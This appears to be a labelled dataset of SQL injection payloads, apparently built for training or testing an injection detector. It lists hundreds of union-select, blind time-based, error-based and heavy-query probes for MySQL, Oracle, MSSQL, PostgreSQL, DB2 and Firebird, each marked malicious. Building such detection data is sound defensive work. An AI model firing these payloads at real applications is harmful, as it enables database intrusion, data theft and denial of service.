payload;attack_type;label
-1920'))) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#;SQL injection;malicious
"1);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#";SQL injection;malicious
"1) as fhvr where 5544=5544;iif(5257=5257,1,1/0)";SQL injection;malicious
-5957))) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--;SQL injection;malicious
"1);iif(5462=8866,1,1/0)";SQL injection;malicious
1)) union all select null,null--;SQL injection;malicious
"1%';begin dbms_lock.sleep(5); end and '%'='";SQL injection;malicious
"1"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""eeye""=""eeye";SQL injection;malicious
1' in boolean mode) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)#;SQL injection;malicious
1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'qcsi'='qcsi;SQL injection;malicious
-7812') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ttvo'='ttvo;SQL injection;malicious
1' or 8514=benchmark(5000000,md5(0x544d5a4c))#;SQL injection;malicious
-5396'||(select 'fjhd' from dual where 4019=4019 union all select 4019,4019,4019,4019#;SQL injection;malicious
"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--";SQL injection;malicious
"1"") where 5298=5298 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--";SQL injection;malicious
"1""))) and (select * from (select(sleep(5)))fzno) and (((""jenb"" like ""jenb";SQL injection;malicious
"1%"") rlike (select (case when (7736=7642) then 1 else 0x28 end)) and (""%""=""";SQL injection;malicious
1 waitfor delay '0:0:5'--;SQL injection;malicious
1'||(select 'nvrq' from dual where 4337=4337 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
"1%"")) and elt(1210=1210,sleep(5)) and ((""%""=""";SQL injection;malicious
"1"")) and 9198=9198--";SQL injection;malicious
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--";SQL injection;malicious
"1%"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""";SQL injection;malicious
1%')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'=';SQL injection;malicious
"-6548%"") union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--";SQL injection;malicious
-2891 where 1770=1770 or 9290=5866;SQL injection;malicious
"1')));begin user_lock.sleep(5); end and ((('hglq' like 'hglq";SQL injection;malicious
"1"")) as qode where 2398=2398 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--";SQL injection;malicious
1'||(select 'txyy' where 6500=6500 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))||';SQL injection;malicious
1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('hpbt'='hpbt;SQL injection;malicious
1) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)));SQL injection;malicious
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""utzr"" like ""utzr";SQL injection;malicious
1')) as wves where 2641=2641 and 2388=benchmark(5000000,md5(0x6d457153))#;SQL injection;malicious
-6190') where 2621=2621 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--;SQL injection;malicious
-6160'))) or make_set(1924=4415,4415) and ((('hayr'='hayr;SQL injection;malicious
"1');select (case when (7096=2568) then 7096 else 1/(select 0) end)--";SQL injection;malicious
-5020%') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=';SQL injection;malicious
1))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8814=8814;SQL injection;malicious
1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded;SQL injection;malicious
"1%"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""";SQL injection;malicious
1' and (3020=3020)*6703 and 'qsrz'='qsrz;SQL injection;malicious
1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph;SQL injection;malicious
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
"1"" and make_set(8403=8403,8899) and ""fqxr"" like ""fqxr";SQL injection;malicious
1'))) and 9198=9198--;SQL injection;malicious
1'||(select 'exls' where 3837=3837 and sleep(5))||';SQL injection;malicious
"1"" where 7249=7249 union all select null,null,null,null,null,null,null,null,null,null--";SQL injection;malicious
1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
1'||(select 'tfqg' from dual where 9862=9862 and (select * from (select(sleep(5)))gcrr)#;SQL injection;malicious
1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671;SQL injection;malicious
-2516) where 3349=3349 or 4855=1806--;SQL injection;malicious
"1%"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""%""=""";SQL injection;malicious
1))) union all select null,null,null,null#;SQL injection;malicious
-1065)) union all select 7437,7437,7437,7437,7437,7437,7437,7437--;SQL injection;malicious
"1%"" and make_set(2905=5725,5725) and ""%""=""";SQL injection;malicious
1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (5098=5098;SQL injection;malicious
1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('brlc'='brlc;SQL injection;malicious
-4860') as azyx where 6901=6901 union all select 6901,6901,6901,6901,6901#;SQL injection;malicious
1%') union all select null,null#;SQL injection;malicious
-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--;SQL injection;malicious
"1"") where 3250=3250 union all select null#";SQL injection;malicious
"-1748%""))) union all select 2987#";SQL injection;malicious
1'+(select papc where 8900=8900 and elt(3114=3114,sleep(5))#;SQL injection;malicious
"-3541"" or make_set(9354=9354,7185) and ""fgxu""=""fgxu";SQL injection;malicious
1'+(select gguu where 7809=7809 union all select null--;SQL injection;malicious
1') as svtm where 7627=7627 rlike (select * from (select(sleep(5)))sgvo)--;SQL injection;malicious
1'||(select 'jonh' from dual where 2415=2415 union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('sqnk'='sqnk;SQL injection;malicious
"1"" and (7597=8422)*8422 and ""gywp"" like ""gywp";SQL injection;malicious
1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('cpfn' like 'cpfn;SQL injection;malicious
1 and (3020=3020)*6703;SQL injection;malicious
1)) as qfnu where 1609=1609 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
-8056)) as botl where 9225=9225 or (1182=7641)*7641--;SQL injection;malicious
1) as iupg where 2861=2861 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
1) where 5598=5598 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
-2307'))) or 6872=6872 and ((('fyok' like 'fyok;SQL injection;malicious
1%') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#;SQL injection;malicious
1%' order by 1#;SQL injection;malicious
"1""))) and elt(1210=1210,sleep(5)) and (((""felm""=""felm";SQL injection;malicious
1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null);SQL injection;malicious
"1)) as bjxd where 4299=4299;select pg_sleep(5)--";SQL injection;malicious
"1"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--";SQL injection;malicious
"-4300"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""klbu""=""klbu";SQL injection;malicious
1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# zwck;SQL injection;malicious
-8026 or elt(8434=4516,4516)# bsqo;SQL injection;malicious
-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--;SQL injection;malicious
-8341 or 8571=8571--;SQL injection;malicious
"1%"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""";SQL injection;malicious
1') rlike (select (case when (2721=8716) then 1 else 0x28 end)) and ('dumt'='dumt;SQL injection;malicious
"1"")) as pqbs where 4409=4409;iif(1746=1730,1,1/0)";SQL injection;malicious
"1')));select (case when (1227=4014) then 1227 else 1227*(select 1227 from mysql.db) end)#";SQL injection;malicious
1'||(select 'xyft' from dual where 8250=8250 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||';SQL injection;malicious
"1"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--";SQL injection;malicious
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--";SQL injection;malicious
"1"") where 5196=5196 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--";SQL injection;malicious
1%' and (select * from (select(sleep(5)))gcrr)#;SQL injection;malicious
"-6971"" or 4747=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ifuh"" like ""ifuh";SQL injection;malicious
"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""htyi""=""htyi";SQL injection;malicious
1 where 6169=6169 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--;SQL injection;malicious
"1')) as eymg where 7000=7000;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#";SQL injection;malicious
"1)) as somz where 1598=1598;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--";SQL injection;malicious
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('yvbb'='yvbb";SQL injection;malicious
"1"") where 8878=8878 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--";SQL injection;malicious
1)) union all select null,null,null,null,null,null#;SQL injection;malicious
"1') where 5307=5307;waitfor delay '0:0:5'--";SQL injection;malicious
1'))) and 5615=5458--;SQL injection;malicious
"1"")) order by 1#";SQL injection;malicious
-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup;SQL injection;malicious
1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (8529=8529;SQL injection;malicious
"1' where 2958=2958;if(6647=2179) select 6647 else drop function zvlq--";SQL injection;malicious
1' where 8360=8360 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--;SQL injection;malicious
-8234'))) or 9323=9323#;SQL injection;malicious
"1') where 5378=5378;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--";SQL injection;malicious
1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542;SQL injection;malicious
1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('bfrq' like 'bfrq;SQL injection;malicious
-4901) or 3407=6442#;SQL injection;malicious
1 and (select * from (select(sleep(5)))gcrr)#;SQL injection;malicious
-1868)) union all select 1859,1859--;SQL injection;malicious
1' and 2908=8067--;SQL injection;malicious
"1"" where 4319=4319;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--";SQL injection;malicious
1')) union all select null,null,null,null--;SQL injection;malicious
1%' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--;SQL injection;malicious
"1""))) and 9198=9198--";SQL injection;malicious
1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null);SQL injection;malicious
"1%"")) and (3020=3020)*6703 and ((""%""=""";SQL injection;malicious
1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('xwhi'='xwhi;SQL injection;malicious
-9355' or 6872=6872 and 'mztk'='mztk;SQL injection;malicious
"1 where 7254=7254;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
"1"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--";SQL injection;malicious
"1')));select * from generate_series(7754,7754,case when (7754=1252) then 1 else 0 end) limit 1--";SQL injection;malicious
"1%"") order by 1#";SQL injection;malicious
1) union all select null--;SQL injection;malicious
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'hyun' like 'hyun;SQL injection;malicious
"-5027%"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""";SQL injection;malicious
"1%"" and 7533=7533 and ""%""=""";SQL injection;malicious
"1' where 5547=5547;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--";SQL injection;malicious
"1"")) and 8407=(select count(*) from generate_series(1,5000000)) and ((""tfrs""=""tfrs";SQL injection;malicious
1' where 7417=7417 and 8407=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
"-1510"") as rqrv where 4507=4507 union all select 4507,4507,4507,4507,4507--";SQL injection;malicious
"1'||(select 'glec' from dual where 4846=4846;call regexp_substring(repeat(right(char(2385),0),500000000),null)--";SQL injection;malicious
1) as hlcn where 1165=1165 rlike (select * from (select(sleep(5)))vwyq)#;SQL injection;malicious
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""hvwv""=""hvwv";SQL injection;malicious
"1"") as tecq where 4817=4817 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--";SQL injection;malicious
1') where 5680=5680 and (3020=3020)*6703--;SQL injection;malicious
"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""%""=""";SQL injection;malicious
"1%"");(select * from (select(sleep(5)))acdk)#";SQL injection;malicious
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv";SQL injection;malicious
-2364'+(select 'qdut' where 7560=7560 union all select 7560,7560,7560,7560,7560--;SQL injection;malicious
1')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--;SQL injection;malicious
"1%""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""%""=""";SQL injection;malicious
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'=';SQL injection;malicious
1 union all select null,null,null,null,null,null,null,null--;SQL injection;malicious
"1%';select (case when (9490=6134) then 9490 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
-1375'))) or (1226=9648)*9648 and ((('kfoy' like 'kfoy;SQL injection;malicious
1'||(select 'mgel' where 3591=3591 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||';SQL injection;malicious
1) and 4595=4595#;SQL injection;malicious
"1"")) and make_set(8266=9226,9226) and ((""omjx"" like ""omjx";SQL injection;malicious
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3";SQL injection;malicious
"1'));waitfor delay '0:0:5' and (('yjsp' like 'yjsp";SQL injection;malicious
"-1059"") union all select 1276,1276,1276,1276,1276,1276,1276,1276#";SQL injection;malicious
"1"") where 4180=4180 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--";SQL injection;malicious
1%')) union all select null,null,null,null,null,null--;SQL injection;malicious
1%') order by 1--;SQL injection;malicious
-4694') where 1501=1501 union all select 1501,1501,1501,1501,1501,1501#;SQL injection;malicious
1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('fvbv'='fvbv;SQL injection;malicious
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""yzjl"" like ""yzjl";SQL injection;malicious
1) where 6954=6954 and 3824=benchmark(5000000,md5(0x76555642))--;SQL injection;malicious
1%') or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--;SQL injection;malicious
"1%')));select pg_sleep(5)--";SQL injection;malicious
"1');select pg_sleep(5) and ('aydg'='aydg";SQL injection;malicious
1%'))) and 4595=4595#;SQL injection;malicious
1%'))) union all select null,null,null,null,null#;SQL injection;malicious
1%'))) and sleep(5) and ((('%'=';SQL injection;malicious
-5548' where 4477=4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--;SQL injection;malicious
1) where 9821=9821 or (select * from (select(sleep(5)))sddo)#;SQL injection;malicious
-8117' union all select 9945,9945,9945,9945,9945,9945,9945#;SQL injection;malicious
"1;(select * from (select(sleep(5)))srmq)# gkkx";SQL injection;malicious
1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1);SQL injection;malicious
1))) and 8990=4775 and (((1894=1894;SQL injection;malicious
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""thkh"" like ""thkh";SQL injection;malicious
"-8633"" or 5099=5974";SQL injection;malicious
"1"") where 2837=2837 and (3020=3020)*6703--";SQL injection;malicious
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)";SQL injection;malicious
1' or elt(5873=5873,sleep(5))#;SQL injection;malicious
1' in boolean mode) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)#;SQL injection;malicious
-5861') or 1581=2611 and ('mvjh' like 'mvjh;SQL injection;malicious
"1) where 4711=4711;select count(*) from generate_series(1,5000000)--";SQL injection;malicious
"1'+(select myci where 8903=8903;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
"1"") as ltbl where 6395=6395;call regexp_substring(repeat(right(char(2385),0),500000000),null)--";SQL injection;malicious
"1';select (case when (1412=5313) then 1412 else 1412*(select 1412 from mysql.db) end)#";SQL injection;malicious
"1""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""twpn"" like ""twpn";SQL injection;malicious
"1'+(select 'jaok' where 2592=2592;select sleep(5))+'";SQL injection;malicious
"1"") as duvm where 6190=6190 order by 1--";SQL injection;malicious
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')-- izad;SQL injection;malicious
"-3960"")) union all select 7813,7813,7813,7813,7813,7813--";SQL injection;malicious
"-6809"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""nfnf""=""nfnf";SQL injection;malicious
"1"" and sleep(5) and ""masm""=""masm";SQL injection;malicious
1))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8023=8023;SQL injection;malicious
-5365 or 7517=5726--;SQL injection;malicious
"1""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""ijag""=""ijag";SQL injection;malicious
1) where 7165=7165 and sleep(5)#;SQL injection;malicious
"1'||(select 'xhcr' from dual where 9279=9279;iif(2452=8999,1,1/0)";SQL injection;malicious
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""qkat""=""qkat";SQL injection;malicious
"-5181""))) or elt(1032=1032,3623) and (((""qofp""=""qofp";SQL injection;malicious
"-2625"")) as qfuo where 1980=1980 union all select 1980,1980,1980--";SQL injection;malicious
(case when 6398=6398 then 1 else null end);SQL injection;malicious
1') where 2753=2753 and (2739=8047)*8047--;SQL injection;malicious
1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('ngwt'='ngwt;SQL injection;malicious
"1%"")) and 6969=(select 6969 from pg_sleep(5)) and ((""%""=""";SQL injection;malicious
1' where 1153=1153 or (select * from (select(sleep(5)))ydpu)--;SQL injection;malicious
"1"" rlike (select (case when (3711=3313) then 1 else 0x28 end)) and ""iqlh"" like ""iqlh";SQL injection;malicious
"1"" or sleep(5) and ""fbuo"" like ""fbuo";SQL injection;malicious
-9370') where 7070=7070 or make_set(9354=9354,7185)--;SQL injection;malicious
"1"") as lipa where 3450=3450 and make_set(8403=8403,8899)--";SQL injection;malicious
1) where 1333=1333 order by 1--;SQL injection;malicious
"1"")) or elt(6272=6272,sleep(5)) and ((""chvi"" like ""chvi";SQL injection;malicious
1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)# tsxs;SQL injection;malicious
1) where 2741=2741 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--;SQL injection;malicious
1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ogwd' like 'ogwd;SQL injection;malicious
"1"")) as tfjh where 1134=1134 and 8635=(select count(*) from generate_series(1,5000000))--";SQL injection;malicious
"1%'));select benchmark(5000000,md5(0x4c4d6142)) and (('%'='";SQL injection;malicious
-4955%' union all select 5928,5928--;SQL injection;malicious
1%')) union all select null--;SQL injection;malicious
1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#;SQL injection;malicious
1'+(select 'mikf' where 5814=5814 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
"1"") where 6809=6809 rlike (select * from (select(sleep(5)))sgvo)--";SQL injection;malicious
"1%');waitfor delay '0:0:5'--";SQL injection;malicious
1'||(select 'boxx' where 2038=2038 and 9198=9198--;SQL injection;malicious
"1"" or 8421=(select count(*) from generate_series(1,5000000)) and ""ncym"" like ""ncym";SQL injection;malicious
"1%""));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
1')) and 6969=(select 6969 from pg_sleep(5)) and (('glfq' like 'glfq;SQL injection;malicious
-3593%' union all select 6346,6346,6346,6346,6346,6346--;SQL injection;malicious
1))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((6062=6062;SQL injection;malicious
"1%"")));select count(*) from generate_series(1,5000000) and (((""%""=""";SQL injection;malicious
"1"") where 7452=7452;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
1')) as tgso where 1349=1349 union all select null,null,null,null--;SQL injection;malicious
1) and (select * from (select(sleep(5)))fzno) and (6824=6824;SQL injection;malicious
-9217 or 9323=9323#;SQL injection;malicious
-1891' in boolean mode) union all select 6680,6680,6680,6680,6680,6680,6680,6680#;SQL injection;malicious
"-6158"") union all select 3084,3084,3084,3084,3084,3084#";SQL injection;malicious
"-4355""))) or 9323=9323#";SQL injection;malicious
"-4637"" where 8354=8354 or 1186=2714--";SQL injection;malicious
"1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('%'='";SQL injection;malicious
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""";SQL injection;malicious
1%' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#;SQL injection;malicious
"1"" rlike sleep(5) and ""veub""=""veub";SQL injection;malicious
1') as ghvi where 3880=3880 and 4595=4595#;SQL injection;malicious
1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('rggg'='rggg;SQL injection;malicious
"1);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--";SQL injection;malicious
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""gimc"" like ""gimc";SQL injection;malicious
